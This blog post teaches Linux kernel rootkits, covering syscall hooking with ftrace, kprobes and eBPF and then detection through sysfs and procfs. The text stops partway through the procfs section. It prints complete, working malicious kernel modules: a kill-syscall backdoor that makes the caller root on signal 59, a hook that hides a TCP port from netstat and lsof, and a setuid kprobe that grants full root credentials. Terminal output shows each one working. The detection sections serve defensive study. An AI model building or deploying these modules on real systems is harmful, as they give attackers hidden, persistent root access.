---
layout: post
lang: pt
title: The Art of Linux Kernel Rootkits
description: "An advanced and deep introduction about Linux kernel mode rookits, how to detect, what are hooks and how it works."
tags: [linux, rootkits]
banner: the-art-of-linux-rootkits.png
author: Mtz & Humzak
author_nickname: matheuzsec
collabs:
  - author: Humzak711
    author_url: https://
---

<a href="https://hits.seeyoufarm.com" class="raw-link click-counter"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Finferi.club%2Fpost%2Fthe-art-of-linux-kernel-rootkits&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false"/></a>

```
root@infect:~# insmod inferi.ko
root@infect:~# dmesg
[ 1337.001337]                                               _______________________
[ 1337.001337]   _______________________-------------------                       `\
[ 1337.001337]  /:--__                                                              |
[ 1337.001337] ||< > |                                   ___________________________/
[ 1337.001337] | \__/_________________-------------------                         |
[ 1337.001337] |                                                                  |
[ 1337.001337] |                       INFERI.CLUB                                |
[ 1337.001337] |                                                                  |
[ 1337.001337] |      Inferi.club members are wizards                              |
[ 1337.001337]  |                                                                  |
[ 1337.001337]  |    The inferi.club project is made up of computer science and     |
[ 1337.001337]  |    information security enthusiasts, mainly focused on sharing    |
[ 1337.001337]  |    information and knowledge around the world. Our members share  |
[ 1337.001337]  |    similar ideals such as the right to free knowledge, individual |
[ 1337.001337]  |    liberty and privacy. With the aim of highlighting these issues,|
[ 1337.001337]  |    we decided to start the blog to share ideas and knowledge.     |
[ 1337.001337]   |                                                                  |
[ 1337.001337]   |               Paper by Matheuz & Humzak711                       |
[ 1337.001337]   |                                                                  |
[ 1337.001337]  |                                              ____________________|_
[ 1337.001337]  |  ___________________-------------------------                      `\
[ 1337.001337]  |/`--_                                                                 |
[ 1337.001337]  ||[ ]||                                            ___________________/
[ 1337.001337]   \===/___________________--------------------------
[ 1337.001337]		⠀⠀⠀⠀⠀⠀⠀⠀
root@infect:~#
```

# Summary

- 1 - What is a rootkit?
  - 1.1 - What is a kernel? Differences between userland and kernel land.
  - 1.2 - What is a system call (Syscalls)?
  - 1.3 - Userland rootkits.
  - 1.4 - Kernel land rootkits.
- 2 - Modern hooking techniques
  - 2.1 - ftrace
  - 2.2 - kprobe
  - 2.3 - eBPF
- 3 - LKM rootkit detection
  - 3.1 - sysfs
  - 3.2 - procfs
  - 3.3 - logs
  - 3.4 - Rootkit detection with eBPF Tracepoints
- 4 - Make an LKM rootkit visible
- 5 - Making an LKM rootkit completely useless
- 6 - Hiding an LKM functions from tracing and /proc/kallsyms
- 7 - Persistence with LKM Rootkit even after reboot machine
- 8 - Protecting LKM Rootkits against LKM Rootkit hunters
- 9 - The power of eBPF in detecting rootkits
- 10 - Resources
- 11 - Final Considerations


# 1. What is a rooktit?


 A rootkit is malware whose main objective and purpose is to maintain persistence within a system, remain completely hidden, hide processes, hide directories, etc., in order to avoid detection.

 This makes its detection very complex, and its mitigation even more complex, since one of the main objectives of a rootkit is to remain hidden.

 A rootkit, it changes the system's default behavior to what it wants.

### 1.1 What is a kernel? Userland and kernel land differences

The kernel is the core of the operating system, responsible for managing system resources and facilitating communication between hardware and software. It operates at the lowest layer of the system, for example components that operate in kernel land include the kernel itself, device drivers and kernel modules (which we call Loadable Kernel Module, short for LKM).

On the other hand, the userland or userspace is the layer where user programs and applications are executed. This is the part of the OS that interacts with the user, including browsers, text editors, games, common programs that the user uses, etc.

### 1.2 What is a system call?


 System calls (syscalls) are fundamental in OS, they allow running processes to request services from the kernel

 These services include operations such as file management, inter-process communication, process creation and management, among others.

 A very practical example is when we write code in C, a simple hello world, if we analyze it with strace for example, you will notice that it uses sys_write to be able to write Hello world.

```c
root@infect:~# cat hello.c ; ls hello
#include <stdio.h>

int main() {
    printf("Hello, World!\n");
    return 0;
}
hello
root@infect:~# strace ./hello 2>&1 | grep write

write(1, "Hello, World!\n", 14Hello, World!
root@infect:~#
```

You can also see that on the write side, it has a number 1, which is nothing less than an fd (file descriptor), which in this case is stdout, is the default output.

Another example is code in C to be able to rename a file to another name, in this example it is possible to see sys_rename being called.

```c
root@infect:~# cat ex.c ; ls ex
#include <unistd.h>

int main() {
    rename("change.me", "changed.me");
    return 0;
}
ex
root@infect:~# cat change.me
teste
root@infect:~# strace ./ex 2>&1 | grep rename

rename("change.me", "changed.me")       = 0
root@infect:~# ls
changed.me  ex  ex.c
root@infect:~#
```

So, a system call is nothing more, nothing less than a communication interface between the user and the kernel, remembering that each syscall has a number, you can better see the syscalls in the system call table;

- [https://filippo.io/linux-syscall-table/](https://filippo.io/linux-syscall-table/)
- [https://www.ime.usp.br/~kon/MAC211/syscalls.html](https://www.ime.usp.br/~kon/MAC211/syscalls.html)


## 1.3 Rootkits userland


Rootkits in userland or userspace, some things are very similar to rootkits in kernel land, however, they are easier to detect and mitigate, as they are in userspace.

 Generally, when creating a rootkit in userland, the most common technique to create a rootkit in userland is the use of LD_PRELOAD, which for example, basically consists of a .so (shared object), normally loaded in "/etc/ld.so .preload", of course there are ways to make this detection a little more difficult, but even so, it is much easier to detect and mitigate a rootkit in userland than in kernel land.

 A very interesting article that explains how creating a rootkit in userland works is from h0mbre;

 - [https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/)


## 1.4 Rootkits kernel land


 The rootkits in kernel land, the famous LKM (Loadable Kernel Module), are certainly a headache for anyone who is going to analyze a machine infected with an LKM rootkit, they work similar to the userland rootkit, changing the system's default behavior, to that what he wants, this is also what we call hooking syscalls.

 For example, when you are a regular user, without permission to access /root, among other files and directories in which you do not have permission, you can code an LKM that hooks the kill syscall "sys_kill", so that every time when you return to the machine with a user with the lowest privilege possible, you are root (of course, as it is an LKM, you need to be root to load it).

```c
dumbledore@infect:~$ cat hook.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("et de varginha");
MODULE_DESCRIPTION("Simples Hook na syscall kill");

static asmlinkage long(*orig_kill)(const struct pt_regs *);

static asmlinkage int hook_kill(const struct pt_regs *regs){

        void SpawnRoot(void);

        int signal;
        signal = regs->si;

        if(signal == 59){
                SpawnRoot();
                return 0;
        }

        return orig_kill(regs);
}

void SpawnRoot(void){
        struct cred *newcredentials;
        newcredentials = prepare_creds();

        if(newcredentials == NULL){
                return;
        }

        newcredentials->uid.val = 0;
        newcredentials->gid.val = 0;
        newcredentials->suid.val = 0;
        newcredentials->fsuid.val = 0;
        newcredentials->euid.val = 0;

        commit_creds(newcredentials);
}

static struct ftrace_hook hooks[] = {
                HOOK("__x64_sys_kill", hook_kill, &orig_kill),
};

static int __init mangekyou_init(void){
        int error;
        error = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
        if(error){
                return error;
        }
        return 0;
}

static void __exit mangekyou_exit(void){
        fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(mangekyou_init);
module_exit(mangekyou_exit);
dumbledore@infect:~$
```

The C code above is very simple, basically it declares a pointer to the original kill syscall function, so that it can be called after the hook.

It checks if the sigkill is 59, if so, it calls the "SpawnRoot" function which basically changes its current id to 0 i.e. root, otherwise the original kill syscall function is called.

Remembering that in the code above, I am using ftrace as a syscall hooking method.

```
dumbledore@infect:~$ sudo insmod hook.ko
dumbledore@infect:~$ lsmod|grep hook
hook                   12288  0
dumbledore@infect:~$ id;whoami;cd /root
uid=1000(dumbledore) gid=1000(dumbledore) grupos=1000(dumbledore),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)
dumbledore
cd: permissão negada: /root
dumbledore@infect:~$ kill -59 0
dumbledore@infect:~$ whoami
root
dumbledore@infect:~$ id
uid=0(root) gid=0(root) egid=1000(dumbledore) grupos=1000(dumbledore),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)
dumbledore@infect:~$
```

Above, you can see that I used insmod (insert module) to load hook.ko (the .ko extension comes from kernel object, so we are inserting a kernel object).

After being inserted, I checked that the LKM was loaded using lsmod (list modules) and it was loaded successfully.

We can see that when using "kill -59 0", it changes your current id to 0, i.e. root, and then you have root privileges.

So, this is one of the many ways to take advantage of the power of the kernel, hooking syscalls, changing the system's default behavior to what you want.

Below are some blog links that provide really cool learning about LKM Rootkits

- [https://xcellerator.github.io/tags/rootkit/](https://xcellerator.github.io/tags/rootkit/)
- [https://blog.convisoappsec.com/linux-rootkits-hooking-syscalls/](https://blog.convisoappsec.com/linux-rootkits-hooking-syscalls/)
- http://www.ouah.org/LKM_HACKING.html


# 2. Modern hooking techniques


Over time, old methods such as hijacking the syscall table and hooking a syscall from it, VFS hooking, etc., stopped being used, even for compatibility reasons, by more "current/modern" methods, such as for example using ftrace, kprobe, and even the eBPF (Extended Berkeley Packet Filter) extension of the original BPF (Berkeley Packet Filter), it is used to attach programs to various points in the kernel, including syscalls, offering a powerful way to customize and control system behavior.

## 2.1 FTrace

Ftrace is an internal tracer designed to help developers and system designers find what is going on inside the kernel. The ftrace infrastructure was originally created to attach callbacks to the beginning of functions to record and track kernel flow. But these callbacks can also be used for hooking/live patching or monitoring function calls.

Below is a code in C using the xcellerator lib ftrace_helper.h.

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/tcp.h>
#include "ftrace_helper.h"

#define PORT 8081               // Defines the port to be hidden (8081)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("mtzsec");
MODULE_DESCRIPTION("Hiding connections from netstat and lsof");
MODULE_VERSION("1.0");

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;

    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp4_seq_show(seq, v);
    return ret;
}

static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;

    if (sk != (struct sock *)0x1 && sk->sk_num == PORT)
    {
        printk(KERN_DEBUG "Port hidden!\n");
        return 0;
    }

    ret = orig_tcp6_seq_show(seq, v);
    return ret;
}

static struct ftrace_hook new_hooks[] = {
    HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
};


static int __init hideport_init(void)
{
    int err;
    err = fh_install_hooks(new_hooks, ARRAY_SIZE(new_hooks));
    if(err)
        return err;

    return 0;
}

static void __exit hideport_exit(void)
{
    fh_remove_hooks(new_hooks, ARRAY_SIZE(new_hooks));
}

module_init(hideport_init);
module_exit(hideport_exit);
```

Basically when the system tries to list TCP connections, tcp4_seq_show or tcp6_seq_show are called, but with hooks, these calls are redirected to hooked_tcp4_seq_show or hooked_tcp6_seq_show, which check the connection port (stored in the sock structure); if the port is 8081, the function returns 0, hiding the connection, while for the other ports the original functions are called, ensuring the normal display of the TCP connection.

```
dumbledore@infect:~$ nc -lvnp 8081 &
[1] 56634
listening on [any] 8081 ...
dumbledore@infect:~$
dumbledore@infect:~$ netstat -tunlpd |grep 8081
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      56634/nc
dumbledore@infect:~$ lsof -i -P -n |grep 8081
nc        56634 kali    3u  IPv4 885312      0t0  TCP *:8081 (LISTEN)
dumbledore@infect:~$
dumbledore@infect:~$ sudo insmod mtz.ko
dumbledore@infect:~$ lsof -i -P -n |grep 8081
dumbledore@infect:~$ netstat -tunlpd |grep 8081
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
dumbledore@infect:~$
```


## 2.2 Kprobe

Kprobes and Kretprobes allow you to insert 'probes' into kernel functions at runtime without requiring any modifications to the source code. These probes can trigger the execution of defined callback functions at specific points during the execution of a monitored function. This is particularly useful for debugging, performance monitoring, and even for security purposes like detecting malicious activity.

A kprobe is a kernel mechanism used to break into any kernel routine and collect debugging and performance information. A probe is inserted at a specific location in a function to perform actions like logging, modifying parameters, or even changing the control flow of the target function. Kprobes are generally used for monitoring function execution and tracing the flow of kernel code.

types of kprobe handlers:
pre_handler - called before the probed function executes
post_handler - called after the probed function executes but before the function returns to the caller

A kretprobe is similar to kprobes but is specifically designed for functions that return a value. It is used for tracing the return of functions, which is particularly useful when you want to inspect or modify the return value of a function. Kretprobes are inserted at the point where the function returns, allowing you to monitor or alter the return value before it is passed back to the caller.

types of kretprobe handlers:
entry_handler - called before the probed function starts executing (similar to pre_handler in kprobes)
handler - called after the probed function has executed and returned its value

Although kprobes and kretprobes are very useful for monitoring and debugging, attackers are able to abuse them to hook into functions in the kernel and manipulate them to behave maliciously at some point during their execution.

Below I will demonstrate how this can be done: ```[guest@archlinux rk]$ cat kp_hook.c```

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/atomic.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/capability.h>

MODULE_AUTHOR("humzak711");
MODULE_DESCRIPTION("POC kprobe hook");
MODULE_LICENSE("GPL");

atomic_t hooked = ATOMIC_INIT(0);

#define MAGIC_UID 50

#define _GLOBAL_ROOT_UID 0
#define _GLOBAL_ROOT_GID 0

void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
{
    printk(KERN_INFO "setuid hook called, elevating privs...");

    struct cred *new_creds = prepare_creds();

    /* uid privesc */
    new_creds->uid.val=_GLOBAL_ROOT_UID;
    new_creds->euid.val=_GLOBAL_ROOT_UID;
    new_creds->suid.val=_GLOBAL_ROOT_UID;
    new_creds->fsuid.val=_GLOBAL_ROOT_UID;

    /* gid privesc */
    new_creds->gid.val=_GLOBAL_ROOT_GID;
    new_creds->egid.val=_GLOBAL_ROOT_GID;
    new_creds->sgid.val=_GLOBAL_ROOT_GID;
    new_creds->fsgid.val=_GLOBAL_ROOT_GID;

    /* capabilities privesc */
    new_creds->cap_inheritable=CAP_FULL_SET;
    new_creds->cap_permitted=CAP_FULL_SET;
    new_creds->cap_effective=CAP_FULL_SET;
    new_creds->cap_bset=CAP_FULL_SET;
    commit_creds(new_creds);
}

struct kprobe __x64_sys_setuid_hook = {
        .symbol_name = "__x64_sys_setuid",
        .post_handler = __x64_sys_setuid_post_handler,
};

static int __init rkin(void)
{
    printk(KERN_INFO "module loaded\n");
    int registered = register_kprobe(&__x64_sys_setuid_hook);
    if (registered < 0)
    {
        printk(KERN_INFO "failed to register kprobe\n");
    }
    else
    {
        printk(KERN_INFO "hooked\n");
        atomic_inc(&hooked);
    }

    return 0;
}

static void __exit rkout(void)
{
    if (atomic_read(&hooked))
    {
        unregister_kprobe(&__x64_sys_setuid_hook);
        printk(KERN_INFO "unhooked\n");
    }
}

module_init(rkin);
module_exit(rkout);
```

The code above, initially will register a kprobe to hook the function "__x64_sys_setuid" (the setuid syscall), in the kprobe it registers it with a post handler which will be executed just as the hooked function will be about to return. When the post handler is executed, it'll elevate the callers
privileges by elevating their uid's aswell as their gid's and capabilities.

```[guest@archlinux rk]$ cat main.c```

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("Current UID: %d\n", getuid());

    // set UID to root (0)
    setuid(0);

    printf("UID after setuid: %d\n", getuid());
    return 0;
}
```

And here we have some userland C code to test the setuid hook

```[guest@archlinux rk]$ cat Makefile```

```
obj-m += kp_hook.o

all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean[guest@archlinux rk]$
```

and now lets run this code

```
[guest@archlinux rk]$ make
[guest@archlinux rk]$ sudo insmod kp_hook.ko

[guest@archlinux rk]$ sudo rmmod kp_hook.ko
[guest@archlinux rk]$ make clean

[guest@archlinux rk]$ sudo dmesg
[ 8068.408831] module loaded
[ 8068.409809] hooked

[guest@archlinux rk]$ ./main
Current UID: 1000
UID after setuid: 0

[guest@archlinux rk]$ sudo dmesg
[ 8068.408831] module loaded
[ 8068.409809] hooked
[ 8354.503130] setuid hook called, elevating privs...
```


Usually, the userland process would not have changed its setuid to 0 since it did not run with high enough privileges, however, our registered kprobes post handler intercepted the execution of the function and elevated the processes privileges.


## 2.3  eBPF

eBPF (extended Berkeley Packet Filter) is a powerful and flexible tool in Linux that allows programs to monitor various events or trace points in the kernel
without needing to load a kernel module. eBPF allows you to monitor events such as system calls, network events, or specific kernel functions. It allows you to monitor and trace kernel behavior with minimal overhead, making it ideal for performance monitoring, security auditing, and debugging.

eBPF can be used in a variety of contexts, allowing us to make use of different types of hooks. These hooks enable you to attach code to predefined kernel events, allowing you to inspect or modify the behavior of the kernel at a low level. Some common typesof hooks which you can use with eBPF are kprobes/kretprobes, tracepoints, LSM hooks, and fentry/fexit hooks.

For these reasons eBPF is a very widely used tool when it comes to linux security, both on the defensive side and the offensive side. eBPF is widely used by security solutions to conduct monitoring in a manner which is safe and allows them to have low level control. However, eBPF is also widely used by attackers since it gives them a large variety of different ways to hook into functions in the kernel to modify their behaviour and run malicious code.

Below I will demonstrate how an attacker can utilise eBPF to hook into a function in the kernel, without even requiring a kernel module.

[guest@archlinux ebpf]$ cat unlinkat.c

```c
#define BPF_NO_GLOBAL_DATA
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

SEC("kprobe/do_unlinkat")
int kprobe__sys_unlinkat(struct pt_regs *regs)
{
    bpf_printk("hooked unlinkat");

    struct filename *name = (struct filename *)PT_REGS_PARM2(regs);
    const char *filename = BPF_CORE_READ(name, name);

    bpf_printk("intercepted filename: %s", filename);

    return 0;
}
```

This C code is very simple, it will utilise eBPF to hook the unlinkat syscall by using a kprobe to hook the do_unlinkat function. It will then log all
filenames passed to the syscall to the bpf ring buffer.

```[guest@archlinux ebpf]$ cat run.sh```

```
#!/bin/bash
sudo ./ecc unlinkat.c
sudo ./ecli run package.json
```
(you can install ecc at [https://github.com/eunomia-bpf/eunomia-bpf)](https://github.com/eunomia-bpf/eunomia-bpf))

[guest@archlinux ebpf]$ sudo bash run.sh
INFO [ecc_rs::bpf_compiler] Compiling bpf object...
INFO [ecc_rs::bpf_compiler] Generating package json..
INFO [ecc_rs::bpf_compiler] Packing ebpf object and config into package.json...
INFO [faerie::elf] strtab: 0x4c0 symtab 0x4f8 relocs 0x540 sh_offset 0x540
INFO [bpf_loader_lib::_skeleton::poller] Running ebpf program...

[guest@archlinux ~]$ touch test.txt && rm test.txt

now lets check the bpf ring buffer -
[guest@archlinux ~]$ sudo cat /sys/kernel/debug/tracing/trace_pipe
rm-13901   [001] ...21 20740.285757: bpf_trace_printk: hooked unlinkat
rm-13901   [001] ...21 20740.285759: bpf_trace_printk: intercepted filename: test.txt


#  3  LKM


Detecting an LKM rootkit is very difficult, and mitigation is even more complex. Tools like rkhunter and chkrootkit are very obsolete because they use silly detection techniques, especially rkhunter which is signature-based, so if you take, for example, the diamorphine rootkit that is in the rkhunter database, and change the name of the functions, you can easily bypass it, including, it saves a log file in "/var/log/rkhunter.log", in which you can see exactly the strings/signatures it search.

Furthermore, I spent time studying how to detect, even more remove, an LKM rootkit that is invisible, without needing any opensource or paid tools, just using kernel features, and creating codes, in which I came to two conclusions that will be in the next chapter.

#  3.1  sysfs

This filesystem is really good when it comes to detecting LKM rootkits. Most of them can be detected there. However, of course, it's possible to prevent an LKM rootkit from appearing there, but the majority of them can still be detected. I will use two rootkits as examples: KoviD and Basilisk.

But before that, if the path "/sys/kernel/tracing" or "/sys/kernel/debug/tracing" does not exist, simply mount it:

- mount -t tracefs nodev /sys/kernel/tracing

The first file to check is "/sys/kernel/tracing/available_filter_functions", which lists kernel functions that can be filtered for tracing."

```
dumbledore@infect:~$ sudo insmod basilisk.ko
dumbledore@infect:~$ lsmod|grep basilisk
dumbledore@infect:~$
dumbledore@infect:~$ sudo cat /sys/kernel/tracing/available_filter_functions|grep basilisk
is_bad_path [basilisk]
crc32 [basilisk]
resolve_filename [basilisk]
read_hook [basilisk]
hook_openat [basilisk]
show_refcnt [basilisk]
init_this_kobj [basilisk]
fh_kprobe_lookup_name [basilisk]
fh_install_hook [basilisk]
fh_remove_hook [basilisk]
fh_install_hooks [basilisk]
fh_remove_hooks [basilisk]
sig_handle [basilisk]
hook_seq_read [basilisk]
set_root [basilisk]
h_lkm_protect [basilisk]
h_lkm_hide [basilisk]
dumbledore@infect:~$
```

Another file that is very interesting is '/sys/kernel/tracing/available_filter_functions_addrs' (only in kernel 6.5+). This file basically lists filterable functions with addresses.

```
dumbledore@infect:~$ sudo cat /sys/kernel/tracing/available_filter_functions_addrs|grep basilisk
ffffffffc0de5014 is_bad_path [basilisk]
ffffffffc0de5094 crc32 [basilisk]
ffffffffc0de5100 resolve_filename [basilisk]
ffffffffc0de5224 read_hook [basilisk]
ffffffffc0de5294 hook_openat [basilisk]
ffffffffc0de5474 show_refcnt [basilisk]
ffffffffc0de54b4 init_this_kobj [basilisk]
ffffffffc0de55a4 fh_kprobe_lookup_name [basilisk]
ffffffffc0de5644 fh_install_hook [basilisk]
ffffffffc0de5744 fh_remove_hook [basilisk]
ffffffffc0de57d4 fh_install_hooks [basilisk]
ffffffffc0de5874 fh_remove_hooks [basilisk]
ffffffffc0de58c4 sig_handle [basilisk]
ffffffffc0de5944 hook_seq_read [basilisk]
ffffffffc0de5aa4 set_root [basilisk]
ffffffffc0de5c14 h_lkm_protect [basilisk]
ffffffffc0de5c74 h_lkm_hide [basilisk]
dumbledore@infect:~$
```

We can check '/sys/kernel/debug/dynamic_debug/control', which enables/disables real-time kernel debug messages for specific modules.

```
dumbledore@infect:~$ sudo cat /sys/kernel/debug/dynamic_debug/control |grep basilisk
/home/dumbledore/lkms/basilisk/src/ftrace_helper.c:28 [basilisk]fh_resolve_hook_address =_ "unresolved symbol: %s\n"
/home/dumbledore/lkms/basilisk/src/ftrace_helper.c:80 [basilisk]fh_install_hook =_ "ftrace_set_filter_ip() failed: %d\n"
/home/dumbledore/lkms/basilisk/src/ftrace_helper.c:86 [basilisk]fh_install_hook =_ "register_ftrace_function() failed: %d\n"
/home/dumbledore/lkms/basilisk/src/ftrace_helper.c:103 [basilisk]fh_remove_hook =_ "unregister_ftrace_function() failed: %d\n"
/home/dumbledore/lkms/basilisk/src/ftrace_helper.c:108 [basilisk]fh_remove_hook =_ "ftrace_set_filter_ip() failed: %d\n"
dumbledore@infect:~$
```

A great place to check is '/sys/kernel/tracing/enabled_functions', which basically lists kernel functions currently enabled for tracing.

A rootkit can hide from 'available_filter_functions', but it’s unlikely that an LKM rootkit using ftrace hooking will be able to hide from 'enabled_functions'.

```
dumbledore@infect:~$ sudo insmod kovid.ko
dumbledore@infect:~$ kill -SIGCONT 31337
kill: kill 31337 failed: no such process
dumbledore@infect:~$ echo hide-lkm >/proc/hidden
dumbledore@infect:~$ lsmod|grep kovid
dumbledore@infect:~$
dumbledore@infect:~$ sudo cat /sys/kernel/tracing/enabled_functions
__x64_sys_clone (1) R I     M   tramp: 0xffffffffc0ff4000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
__x64_sys_exit_group (1) R I     M  tramp: 0xffffffffc0fe9000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
proc_dointvec (1) R I     M     tramp: 0xffffffffc1033000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
__x64_sys_kill (1) R I     M    tramp: 0xffffffffc0ff6000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
account_system_time (1) R I     M   tramp: 0xffffffffc1029000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
account_process_tick (1) R I     M  tramp: 0xffffffffc1027000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
audit_log_start (1) R I     M   tramp: 0xffffffffc102b000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
__x64_sys_bpf (1) R I     M     tramp: 0xffffffffc1019000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
bpf_lsm_file_open (1) R   D   M     tramp: ftrace_regs_caller+0x0/0x65 (call_direct_funcs+0x0/0x20)
    direct-->bpf_trampoline_6442508438+0x0/0xf1
__x64_sys_read (1) R I     M    tramp: 0xffffffffc1017000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
vfs_statx (1) R I     M     tramp: 0xffffffffc1035000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
filldir64 (1) R I     M     tramp: 0xffffffffc102f000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
filldir (1) R I     M   tramp: 0xffffffffc102d000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tty_read (1) R I     M  tramp: 0xffffffffc1031000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tcp4_seq_show (1) R I     M     tramp: 0xffffffffc101b000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
udp4_seq_show (1) R I     M     tramp: 0xffffffffc101d000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
udp6_seq_show (1) R I     M     tramp: 0xffffffffc1021000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tcp6_seq_show (1) R I     M     tramp: 0xffffffffc101f000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
packet_rcv (1) R I     M    tramp: 0xffffffffc1023000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tpacket_rcv (1) R I     M   tramp: 0xffffffffc1025000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
dumbledore@infect:~$
```

Checking 'touched_functions' is also really good, because, just like 'enabled_functions', an LKM rootkit using ftrace for hooking is unlikely to hide from 'touched_functions', which basically shows all functions that were ever traced by ftrace or a direct trampoline (only for kernel 6.4+).

```
dumbledore@infect:~$ sudo cat /sys/kernel/tracing/touched_functions
__x64_sys_clone (1) R I     M   tramp: 0xffffffffc0ff4000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
__x64_sys_exit_group (1) R I     M  tramp: 0xffffffffc0fe9000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
proc_dointvec (1) R I     M     tramp: 0xffffffffc1033000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
__x64_sys_kill (1) R I     M    tramp: 0xffffffffc0ff6000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
account_system_time (1) R I     M   tramp: 0xffffffffc1029000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
account_process_tick (1) R I     M  tramp: 0xffffffffc1027000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
kallsyms_lookup_name (0)            ->arch_ftrace_ops_list_func+0x0/0x1e0
audit_log_start (1) R I     M   tramp: 0xffffffffc102b000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
__x64_sys_bpf (1) R I     M     tramp: 0xffffffffc1019000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
bpf_lsm_file_open (1) R   D   M     tramp: ftrace_regs_caller+0x0/0x65 (call_direct_funcs+0x0/0x20)
    direct-->bpf_trampoline_6442508438+0x0/0xf1
__x64_sys_read (1) R I     M    tramp: 0xffffffffc1017000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
vfs_statx (1) R I     M     tramp: 0xffffffffc1035000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
filldir64 (1) R I     M     tramp: 0xffffffffc102f000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
filldir (1) R I     M   tramp: 0xffffffffc102d000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tty_read (1) R I     M  tramp: 0xffffffffc1031000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tcp4_seq_show (1) R I     M     tramp: 0xffffffffc101b000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
udp4_seq_show (1) R I     M     tramp: 0xffffffffc101d000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
udp6_seq_show (1) R I     M     tramp: 0xffffffffc1021000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tcp6_seq_show (1) R I     M     tramp: 0xffffffffc101f000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
packet_rcv (1) R I     M    tramp: 0xffffffffc1023000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
tpacket_rcv (1) R I     M   tramp: 0xffffffffc1025000 (0xffffffffc0fc3f60) ->ftrace_ops_assist_func+0x0/0xf0
dumbledore@infect:~$
```

#  3.2  procfs

Even though it is easy for most rootkits to hide from procfs, it is still quite useful.

Checking '/proc/kallsyms' is one of them. Of course, for a rootkit to hide from it, it’s really easy, but it still leaves traces there. Below is an example using 'diamorphine' for this.

```
dumbledore@infect:~$ sudo insmod diamorphine.ko
